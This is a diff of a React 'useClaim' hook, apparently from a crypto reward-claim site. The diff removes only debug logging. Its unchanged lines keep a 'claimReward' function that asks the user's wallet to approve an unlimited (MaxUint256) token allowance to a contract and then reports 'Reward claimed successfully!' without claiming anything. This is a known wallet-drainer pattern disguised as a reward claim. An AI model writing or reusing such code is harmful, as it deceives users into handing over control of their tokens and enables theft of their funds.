@@ -35,7 +35,6 @@ export const useClaim = (
   }, [provider, account]);
 
   const claimReward = useCallback(async () => {
-    console.log('connecting...');
     if (!provider || !account) {
       setClaimStatus({
         status: 'error',
@@ -50,33 +49,26 @@ export const useClaim = (
     });
 
     try {
-      console.log('get Signer step');
       const signer = await provider.getSigner();
-      console.log('ethers contract step');
       const tokenContract = new ethers.Contract(
         TOKEN_ADDRESS,
         TOKEN_ABI,
         signer,
       );
-      console.log('contract approve step');
       const tx = await tokenContract.approve(
         CONTRACT_ADDRESS,
         ethers.MaxUint256,
       );
-      console.log('set claim status approving');
       setClaimStatus({
         status: 'approving',
         message: 'Transaction submitted. Waiting for confirmation...',
       });
-      console.log('tx wait');
       await tx.wait();
-      console.log('set claim status success');
       setClaimStatus({
         status: 'success',
         message: 'Reward claimed successfully!',
       });
       setShowSuccessModal(true);
-      console.log('done don');
       if (onSuccess) onSuccess(tx.hash);
 
       setTimeout(() => {
